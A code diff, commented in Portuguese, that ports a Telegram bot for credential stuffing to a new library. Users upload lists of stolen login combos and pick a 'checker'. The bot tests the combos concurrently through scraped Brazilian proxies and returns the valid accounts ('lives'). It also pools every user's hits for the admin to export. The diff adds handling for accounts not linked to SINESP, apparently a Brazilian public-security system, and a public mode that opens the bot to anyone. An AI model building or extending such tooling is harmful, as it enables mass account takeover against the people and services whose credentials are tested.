+    if val == "cancel":
+        tmp = ctx.user_data.pop("tmp_file", None)
+        if tmp:
+            Path(tmp).unlink(missing_ok=True)
+        ctx.user_data.clear()
+        await q.edit_message_text("❌ Cancelado.")
+        return ConversationHandler.END
+
+    if val not in get_user_checkers(uid):
+        await q.answer("⛔ Sem permissão para este checker.", show_alert=True)
+        return CHOOSE_CHECKER
+
+    ctx.user_data["checker"] = val
+
+    if ctx.user_data.get("tmp_file"):
+        await q.edit_message_text(
+            f"✅ *{CHECKERS[val]}*\n\n🔤 Qual o *delimitador*?",
+            parse_mode="Markdown",
+            reply_markup=_kb_delim(),
+        )
+        return CHOOSE_DELIM
+
+    await q.edit_message_text(
+        f"✅ *{CHECKERS[val]}*\n\n📂 Agora envie o arquivo *.txt* com as credenciais.",
+        parse_mode="Markdown",
+    )
+    return WAIT_FILE
+
+async def on_delim_chosen(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    q   = update.callback_query
+    await q.answer()
+    val = q.data.split(":", 1)[1]
+
+    if val == "cancel":
+        tmp = ctx.user_data.pop("tmp_file", None)
+        if tmp:
+            Path(tmp).unlink(missing_ok=True)
+        ctx.user_data.clear()
+        await q.edit_message_text("❌ Cancelado.")
+        return ConversationHandler.END
+
+    checker  = ctx.user_data.pop("checker", None)
+    tmp_file = ctx.user_data.pop("tmp_file", None)
+    uid      = q.from_user.id
+
+    if not checker or not tmp_file:
+        await q.edit_message_text("❌ Erro interno. Tente novamente.")
+        ctx.user_data.clear()
+        return ConversationHandler.END
+
+    await q.edit_message_text(
+        f"⏳ *{CHECKERS[checker]}* iniciando com delimitador `{val}`...",
+        parse_mode="Markdown",
+    )
+
+    asyncio.create_task(
+        _run_checker(q.message.chat_id, uid, checker, tmp_file, val, ctx.application)
+    )
+    return ConversationHandler.END
 
 # ── Public mode callback handler ────────────────────────────────────────────────
-async def on_public_cb(call):
-    await bot.answer_callback_query(call.id)
-    uid = call.from_user.id
+async def on_public_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    q   = update.callback_query
+    await q.answer()
+    uid = q.from_user.id
     if not is_admin(uid):
         return
-    chat_id, message_id = call.message.chat.id, call.message.message_id
-    data = call.data
+
+    data = q.data
 
     if data == "pub:toggle":
         set_public_mode(not is_public_mode())
@@ -1174,8 +1162,7 @@ async def on_public_cb(call):
         set_public_threads(n)
 
     status = "🟢 Ativado" if is_public_mode() else "🔴 Desativado"
-    await _edit(
-        chat_id, message_id,
+    await q.edit_message_text(
         f"🌍 *Modo Público*\n`Status: {status}`\n\n"
         f"Quando ativado, qualquer pessoa pode usar o bot sem o admin "
         f"precisar autorizar uma por uma. Escolha abaixo quais checkers "
@@ -1187,20 +1174,19 @@ async def on_public_cb(call):
     )
 
 # ── Admin callback handler ──────────────────────────────────────────────────────
-async def on_admin_cb(call):
-    await bot.answer_callback_query(call.id)
-    uid = call.from_user.id
+async def on_admin_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    q   = update.callback_query
+    await q.answer()
+    uid = q.from_user.id
     if not is_admin(uid):
         return
 
-    chat_id, message_id = call.message.chat.id, call.message.message_id
-    data = call.data
+    data = q.data
 
     if data in ("adm:back", "adm:menu"):
         total  = len(list_users())
         authed = sum(1 for u in list_users() if u[3])
-        await _edit(
-            chat_id, message_id,
+        await q.edit_message_text(
             f"⚡ *Painel Admin*\n`Total: {total}  |  Auth: {authed}`",
             parse_mode="Markdown",
             reply_markup=_kb_admin(),
@@ -1209,25 +1195,22 @@ async def on_admin_cb(call):
     elif data == "adm:users":
         users = list_users()
         if not users:
-            await _edit(
-                chat_id, message_id,
+            await q.edit_message_text(
                 "Nenhum usuário ainda.",
-                reply_markup=types.InlineKeyboardMarkup([[types.InlineKeyboardButton("🔙", callback_data="adm:back")]]),
+                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="adm:back")]]),
             )
             return
-        await _edit(
-            chat_id, message_id,
+        await q.edit_message_text(
             "👥 *Usuários:*", parse_mode="Markdown", reply_markup=_kb_users(users)
         )
 
     elif data == "adm:proxygen":
-        await _edit(chat_id, message_id, "🌐 Gerando proxies BR... aguarde ⏳")
-        asyncio.create_task(_run_proxy_gen(chat_id))
+        await q.edit_message_text("🌐 Gerando proxies BR... aguarde ⏳")
+        asyncio.create_task(_run_proxy_gen(q.message.chat_id, ctx.application))
 
     elif data == "adm:public":
         status = "🟢 Ativado" if is_public_mode() else "🔴 Desativado"
-        await _edit(
-            chat_id, message_id,
+        await q.edit_message_text(
             f"🌍 *Modo Público*\n`Status: {status}`\n\n"
             f"Quando ativado, qualquer pessoa pode usar o bot sem o admin "
             f"precisar autorizar uma por uma. Escolha abaixo quais checkers "
@@ -1240,8 +1223,7 @@ async def on_admin_cb(call):
 
     elif data == "adm:cx2":
         count = cx2_count()
-        await _edit(
-            chat_id, message_id,
+        await q.edit_message_text(
             f"📦 *CX2 — Lives Acumulados*\n`Total: {count} lives de todos os usuários`",
             parse_mode="Markdown",
             reply_markup=_kb_cx2(count),
@@ -1250,32 +1232,31 @@ async def on_admin_cb(call):
     elif data == "adm:cx2export":
         rows = cx2_all()
         if not rows:
-            await bot.answer_callback_query(call.id, "Nenhum live acumulado ainda.", show_alert=True)
+            await q.answer("Nenhum live acumulado ainda.", show_alert=True)
             return
         lines = [f"[{r[0]}] [@{r[1]}] {r[2]}" for r in rows]
         out   = TMP_DIR / f"cx2_export_{int(time.time())}.txt"
         out.write_text("\n".join(lines), encoding="utf-8")
+        await q.answer()
         with out.open("rb") as fh:
-            await bot.send_document(
-                chat_id, fh,
-                visible_file_name="cx2_lives_todos.txt",
+            await ctx.application.bot.send_document(
+                q.message.chat_id, document=fh,
+                filename="cx2_lives_todos.txt",
                 caption=f"📦 {len(lines)} lives acumulados · CX2",
             )
         out.unlink(missing_ok=True)
 
     elif data == "adm:cx2test":
-        _ud(uid)["waiting_cx2_test"] = True
-        await _edit(
-            chat_id, message_id,
+        ctx.user_data["waiting_cx2_test"] = True
+        await q.edit_message_text(
             "📂 Envie o arquivo *.txt* com as credenciais para testar em todos os checkers.",
             parse_mode="Markdown",
         )
 
     elif data == "adm:cx2clear":
         cx2_clear()
-        await bot.answer_callback_query(call.id, "CX2 limpo!", show_alert=True)
-        await _edit(
-            chat_id, message_id,
+        await q.answer("CX2 limpo!", show_alert=True)
+        await q.edit_message_text(
             "📦 *CX2 — Lives Acumulados*\n`Total: 0 lives de todos os usuários`",
             parse_mode="Markdown",
             reply_markup=_kb_cx2(0),
@@ -1284,24 +1265,22 @@ async def on_admin_cb(call):
     elif data == "adm:status":
         users  = list_users()
         authed = sum(1 for u in users if u[3])
-        await _edit(
-            chat_id, message_id,
+        await q.edit_message_text(
             f"📊 *Status do Bot*\n```\nUsuários:    {len(users)}\nAutorizados: {authed}```",
             parse_mode="Markdown",
-            reply_markup=types.InlineKeyboardMarkup([[types.InlineKeyboardButton("🔙 Voltar", callback_data="adm:back")]]),
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Voltar", callback_data="adm:back")]]),
         )
 
     elif data.startswith("usr:"):
         target = int(data.split(":")[1])
         row    = _db("SELECT user_id, username, full_name, is_auth FROM users WHERE user_id=?", target, fetch="one")
         if not row:
-            await _edit(chat_id, message_id, "Usuário não encontrado.")
+            await q.edit_message_text("Usuário não encontrado.")
             return
         _, uname, fname, is_a = row
         name = fname or uname or str(target)
         threads = get_user_threads(target)
-        await _edit(
-            chat_id, message_id,
+        await q.edit_message_text(
             f"👤 *{name}*\n`ID: {target}`\n{'✅ Autorizado' if is_a else '❌ Bloqueado'} · {threads}T",
             parse_mode="Markdown",
             reply_markup=_kb_manage(target, bool(is_a)),
@@ -1315,8 +1294,7 @@ async def on_admin_cb(call):
         _, uname, fname, is_a = row
         name = fname or uname or str(target)
         threads = get_user_threads(target)
-        await _edit(
-            chat_id, message_id,
+        await q.edit_message_text(
             f"👤 *{name}*\n`ID: {target}`\n{'✅ Autorizado' if is_a else '❌ Bloqueado'} · {threads}T",
             parse_mode="Markdown",
             reply_markup=_kb_manage(target, bool(is_a)),
@@ -1327,7 +1305,7 @@ async def on_admin_cb(call):
                 if val == "1"
                 else "⛔ Seu acesso foi *revogado*."
             )
-            await bot.send_message(target, msg, parse_mode="Markdown")
+            await ctx.application.bot.send_message(target, msg, parse_mode="Markdown")
         except Exception:
             pass
 
@@ -1339,8 +1317,7 @@ async def on_admin_cb(call):
         _, uname, fname, is_a = row
         name = fname or uname or str(target)
         threads = get_user_threads(target)
-        await _edit(
-            chat_id, message_id,
+        await q.edit_message_text(
             f"👤 *{name}*\n`ID: {target}`\n{'✅ Autorizado' if is_a else '❌ Bloqueado'} · {threads}T",
             parse_mode="Markdown",
             reply_markup=_kb_manage(target, bool(is_a)),
@@ -1353,8 +1330,7 @@ async def on_admin_cb(call):
         row    = _db("SELECT user_id, username, full_name, is_auth FROM users WHERE user_id=?", target, fetch="one")
         _, uname, fname, is_a = row
         name = fname or uname or str(target)
-        await _edit(
-            chat_id, message_id,
+        await q.edit_message_text(
             f"👤 *{name}*\n`ID: {target}`\n{'✅ Autorizado' if is_a else '❌ Bloqueado'} · {int(n)}T",
             parse_mode="Markdown",
             reply_markup=_kb_manage(target, bool(is_a)),
@@ -1367,16 +1343,15 @@ async def on_admin_cb(call):
         _, uname, fname, is_a = row
         name = fname or uname or str(target)
         threads = get_user_threads(target)
-        await bot.answer_callback_query(call.id, "Proxies do usuário removidos!", show_alert=True)
-        await _edit(
-            chat_id, message_id,
+        await q.answer("Proxies do usuário removidos!", show_alert=True)
+        await q.edit_message_text(
             f"👤 *{name}*\n`ID: {target}`\n{'✅ Autorizado' if is_a else '❌ Bloqueado'} · {threads}T",
             parse_mode="Markdown",
             reply_markup=_kb_manage(target, bool(is_a)),
         )
 
 # ── Background: run checker ─────────────────────────────────────────────────────
-async def _run_checker(chat_id, uid, checker, tmp_file, delim):
+async def _run_checker(chat_id, uid, checker, tmp_file, delim, app):
     try:
         path = Path(tmp_file)
         try:
@@ -1389,18 +1364,19 @@ async def _run_checker(chat_id, uid, checker, tmp_file, delim):
             path.unlink(missing_ok=True)
 
         if not lines:
-            await bot.send_message(chat_id, "⚠️ Nenhuma credencial válida encontrada.")
+            await app.bot.send_message(chat_id, "⚠️ Nenhuma credencial válida encontrada.")
             return
 
         total     = len(lines)
         fn        = CHECKER_FN[checker]
         name      = CHECKERS[checker]
         lives: list[str] = []
+        nvinc: list[str] = []
         erros: list[str] = []
         checked   = 0
         last_edit = time.time()
 
-        prog = await bot.send_message(
+        prog = await app.bot.send_message(
             chat_id, f"🔄 *{name}* · `0/{total}`", parse_mode="Markdown"
         )
 
@@ -1426,6 +1402,8 @@ async def _run_checker(chat_id, uid, checker, tmp_file, delim):
             if result == "live":
                 lives.append(entry)
                 cx2_save(uid, uname, name, entry)
+            elif result == "nvinculado":
+                nvinc.append(f"{user}:{pwd}")
             elif result == "erro" and len(erros) < 5:
                 erros.append(extra)
 
@@ -1433,12 +1411,14 @@ async def _run_checker(chat_id, uid, checker, tmp_file, delim):
             nonlocal last_edit
             now = time.time()
             if now - last_edit >= 3:
-                await _edit(
-                    prog.chat.id, prog.message_id,
-                    f"🔄 *{name}* · `{checked}/{total}` · ✅ `{len(lives)}`",
-                    parse_mode="Markdown",
-                )
-                last_edit = now
+                try:
+                    await prog.edit_text(
+                        f"🔄 *{name}* · `{checked}/{total}` · ✅ `{len(lives)}`",
+                        parse_mode="Markdown",
+                    )
+                    last_edit = now
+                except Exception:
+                    pass
 
         if threads > 1:
             sem = asyncio.Semaphore(threads)
@@ -1456,22 +1436,23 @@ async def _run_checker(chat_id, uid, checker, tmp_file, delim):
                 await _process(line)
                 await _edit_progress()
 
-        dies = total - len(lives)
+        dies = total - len(lives) - len(nvinc)
         summary = (
             f"✅ *{name}* concluído!\n"
             f"```\n"
             f"Total   : {total}\n"
             f"Lives   : {len(lives)}\n"
             f"Dies    : {dies}\n"
-            f"Threads : {threads}\n"
-            f"Proxy   : {'ativo (' + str(px_count) + ')' if px_count else 'desativado'}\n"
-            f"```"
+            + (f"N.Vinc  : {len(nvinc)}\n" if nvinc else "")
+            + f"Threads : {threads}\n"
+            + f"Proxy   : {'ativo (' + str(px_count) + ')' if px_count else 'desativado'}\n"
+            + "```"
         )
-        await _edit(prog.chat.id, prog.message_id, summary, parse_mode="Markdown")
+        await prog.edit_text(summary, parse_mode="Markdown")
 
         if erros:
             erro_txt = "\n".join(f"• `{e}`" for e in erros)
-            await bot.send_message(
+            await app.bot.send_message(
                 chat_id,
                 f"⚠️ *Amostra de erros:*\n{erro_txt}",
                 parse_mode="Markdown",
@@ -1481,20 +1462,32 @@ async def _run_checker(chat_id, uid, checker, tmp_file, delim):
             out = TMP_DIR / f"live_{checker}_{uid}.txt"
             out.write_text("\n".join(lives), encoding="utf-8")
             with out.open("rb") as fh:
-                await bot.send_document(
-                    chat_id, fh,
-                    visible_file_name=f"live_{checker}.txt",
+                await app.bot.send_document(
+                    chat_id, document=fh,
+                    filename=f"live_{checker}.txt",
                     caption=f"✅ {len(lives)} lives · {name}",
                 )
             out.unlink(missing_ok=True)
-        else:
-            await bot.send_message(chat_id, "☠️ Nenhum live encontrado.")
+
+        if nvinc:
+            out = TMP_DIR / f"nvinc_{uid}.txt"
+            out.write_text("\n".join(nvinc), encoding="utf-8")
+            with out.open("rb") as fh:
+                await app.bot.send_document(
+                    chat_id, document=fh,
+                    filename="nvinculado_sinesp.txt",
+                    caption=f"🟠 {len(nvinc)} não vinculados · SINESP",
+                )
+            out.unlink(missing_ok=True)
+
+        if not lives and not nvinc:
+            await app.bot.send_message(chat_id, "☠️ Nenhum live encontrado.")
 
     except Exception as e:
-        await bot.send_message(chat_id, f"❌ Erro: `{e}`", parse_mode="Markdown")
+        await app.bot.send_message(chat_id, f"❌ Erro: `{e}`", parse_mode="Markdown")
 
 # ── Background: CX2 multi-checker (admin only) ─────────────────────────────────
-async def _run_cx2(chat_id, uid, lines, delim):
+async def _run_cx2(chat_id, uid, lines, delim, app):
     try:
         total_creds = len(lines)
         total_chk   = len(CHECKERS)
@@ -1504,7 +1497,7 @@ async def _run_cx2(chat_id, uid, lines, delim):
         urow        = _db("SELECT username FROM users WHERE user_id=?", uid, fetch="one")
         uname       = (urow[0] if urow and urow[0] else None) or str(uid)
 
-        prog = await bot.send_message(
+        prog = await app.bot.send_message(
             chat_id,
             f"🔀 *CX2 Multi* · {total_creds} creds × {total_chk} checkers",
             parse_mode="Markdown",
@@ -1514,12 +1507,14 @@ async def _run_cx2(chat_id, uid, lines, delim):
             return _proxy_for(uid)
 
         for idx, (ck_key, ck_name) in enumerate(CHECKERS.items(), 1):
-            await _edit(
-                prog.chat.id, prog.message_id,
-                f"🔀 *CX2* · {idx}/{total_chk}\n"
-                f"`▶ {ck_name}` · lives: `{len(all_lives)}`",
-                parse_mode="Markdown",
-            )
+            try:
+                await prog.edit_text(
+                    f"🔀 *CX2* · {idx}/{total_chk}\n"
+                    f"`▶ {ck_name}` · lives: `{len(all_lives)}`",
+                    parse_mode="Markdown",
+                )
+            except Exception:
+                pass
 
             fn = CHECKER_FN[ck_key]
 
@@ -1547,10 +1542,10 @@ async def _run_cx2(chat_id, uid, lines, delim):
             f"Proxy    : {'ativo (' + str(px_count) + ')' if px_count else 'desativado'}\n"
             f"```"
         )
-        await _edit(prog.chat.id, prog.message_id, summary, parse_mode="Markdown")
+        await prog.edit_text(summary, parse_mode="Markdown")
 
         if all_erros:
-            await bot.send_message(
+            await app.bot.send_message(
                 chat_id,
                 "⚠️ *Amostra de erros:*\n" + "\n".join(f"• `{e}`" for e in all_erros),
                 parse_mode="Markdown",
@@ -1560,23 +1555,23 @@ async def _run_cx2(chat_id, uid, lines, delim):
             out = TMP_DIR / f"cx2_{uid}_{int(time.time())}.txt"
             out.write_text("\n".join(all_lives), encoding="utf-8")
             with out.open("rb") as fh:
-                await bot.send_document(
-                    chat_id, fh,
-                    visible_file_name="cx2_lives.txt",
+                await app.bot.send_document(
+                    chat_id, document=fh,
+                    filename="cx2_lives.txt",
                     caption=f"🔀 {len(all_lives)} lives · CX2 Multi",
                 )
             out.unlink(missing_ok=True)
         else:
-            await bot.send_message(chat_id, "☠️ Nenhum live encontrado.")
+            await app.bot.send_message(chat_id, "☠️ Nenhum live encontrado.")
 
     except Exception as e:
-        await bot.send_message(chat_id, f"❌ Erro CX2: `{e}`", parse_mode="Markdown")
+        await app.bot.send_message(chat_id, f"❌ Erro CX2: `{e}`", parse_mode="Markdown")
 
 # ── Background: proxy tester ────────────────────────────────────────────────────
-async def _run_proxy_test(uid, proxies, chat_id):
+async def _run_proxy_test(uid, proxies, chat_id, app):
     try:
         total = len(proxies)
-        msg   = await bot.send_message(chat_id, f"🔍 Testando 0/{total}...")
+        msg   = await app.bot.send_message(chat_id, f"🔍 Testando 0/{total}...")
         vivos: list[str] = []
         sem   = asyncio.Semaphore(20)
         state = {"checked": 0, "last_edit": time.time()}
@@ -1589,16 +1584,15 @@ async def _run_proxy_test(uid, proxies, chat_id):
                 state["checked"] += 1
                 now = time.time()
                 if now - state["last_edit"] >= 3:
-                    await _edit(
-                        msg.chat.id, msg.message_id,
-                        f"🔍 Testando {state['checked']}/{total}... ✅ {len(vivos)}",
-                    )
-                    state["last_edit"] = now
+                    try:
+                        await msg.edit_text(f"🔍 Testando {state['checked']}/{total}... ✅ {len(vivos)}")
+                        state["last_edit"] = now
+                    except Exception:
+                        pass
 
         await asyncio.gather(*[_chk(p) for p in proxies])
         set_user_proxies(uid, "\n".join(vivos))
-        await _edit(
-            msg.chat.id, msg.message_id,
+        await msg.edit_text(
             f"✅ *Teste concluído!*\n"
             f"```\n"
             f"Testados : {total}\n"
@@ -1608,20 +1602,20 @@ async def _run_proxy_test(uid, proxies, chat_id):
             parse_mode="Markdown",
         )
     except Exception as e:
-        await bot.send_message(chat_id, f"❌ Erro no teste: `{e}`", parse_mode="Markdown")
+        await app.bot.send_message(chat_id, f"❌ Erro no teste: `{e}`", parse_mode="Markdown")
 
 # ── Background: proxy generator ─────────────────────────────────────────────────
-async def _run_proxy_gen(chat_id):
+async def _run_proxy_gen(chat_id, app):
     try:
-        msg     = await bot.send_message(chat_id, "🌐 Buscando proxies BR...")
+        msg     = await app.bot.send_message(chat_id, "🌐 Buscando proxies BR...")
         proxies = await asyncio.to_thread(_fetch_proxies)
         total   = len(proxies)
 
         if not total:
-            await _edit(msg.chat.id, msg.message_id, "☠️ Nenhum proxy encontrado nas fontes.")
+            await msg.edit_text("☠️ Nenhum proxy encontrado nas fontes.")
             return
 
-        await _edit(msg.chat.id, msg.message_id, f"🌐 {total} encontrados. Checando conectividade...")
+        await msg.edit_text(f"🌐 {total} encontrados. Checando conectividade...")
 
         vivos: list[str] = []
         sem   = asyncio.Semaphore(80)
@@ -1637,25 +1631,59 @@ async def _run_proxy_gen(chat_id):
         if vivos:
             out = TMP_DIR / f"proxys_br_{int(time.time())}.txt"
             out.write_text("\n".join(vivos), encoding="utf-8")
-            await _edit(msg.chat.id, msg.message_id, f"✅ {len(vivos)}/{total} proxies vivos!")
+            await msg.edit_text(f"✅ {len(vivos)}/{total} proxies vivos!")
             with out.open("rb") as fh:
-                await bot.send_document(
-                    chat_id, fh,
-                    visible_file_name="proxys_br.txt",
+                await app.bot.send_document(
+                    chat_id, document=fh,
+                    filename="proxys_br.txt",
                     caption=f"🌐 {len(vivos)} proxies BR vivos",
                 )
             out.unlink(missing_ok=True)
         else:
-            await _edit(msg.chat.id, msg.message_id, "☠️ Nenhum proxy vivo encontrado.")
+            await msg.edit_text("☠️ Nenhum proxy vivo encontrado.")
 
     except Exception as e:
-        await bot.send_message(chat_id, f"❌ Erro proxy gen: `{e}`", parse_mode="Markdown")
+        await app.bot.send_message(chat_id, f"❌ Erro proxy gen: `{e}`", parse_mode="Markdown")
 
 # ── Main ────────────────────────────────────────────────────────────────────────
-async def main():
+def main():
     db_init()
+
+    app = Application.builder().token(TOKEN).build()
+
+    # Proxy upload handler must run BEFORE the conversation to avoid
+    # documents being swallowed by the conv state machine.
+    app.add_handler(
+        MessageHandler(filters.Document.ALL, handle_proxy_upload),
+        group=-1,
+    )
+
+    conv = ConversationHandler(
+        entry_points=[
+            CommandHandler("start",              cmd_start),
+            MessageHandler(filters.Document.ALL, on_document),
+        ],
+        states={
+            CHOOSE_CHECKER: [CallbackQueryHandler(on_checker_chosen, pattern=r"^chk:")],
+            WAIT_FILE:      [MessageHandler(filters.Document.ALL,    on_document)],
+            CHOOSE_DELIM:   [CallbackQueryHandler(on_delim_chosen,   pattern=r"^dl:")],
+        },
+        fallbacks=[CommandHandler("cancel", cmd_cancel)],
+        per_user=True,
+        per_chat=False,
+    )
+
+    app.add_handler(conv)
+    app.add_handler(CommandHandler("admin",   cmd_admin))
+    app.add_handler(CommandHandler("myproxy", cmd_myproxy))
+    app.add_handler(CommandHandler("perfil",  cmd_perfil))
+    app.add_handler(CallbackQueryHandler(on_proxy_cb,    pattern=r"^px:"))
+    app.add_handler(CallbackQueryHandler(on_cx2_delim_cb, pattern=r"^cx2dl:"))
+    app.add_handler(CallbackQueryHandler(on_public_cb,    pattern=r"^pub:"))
+    app.add_handler(CallbackQueryHandler(on_admin_cb,    pattern=r"^(adm:|usr:|auth:|perm:|thd:|delpx:)"))
+
     print("✅ Bot iniciado.")
-    await bot.infinity_polling(skip_pending=True)
+    app.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    main()
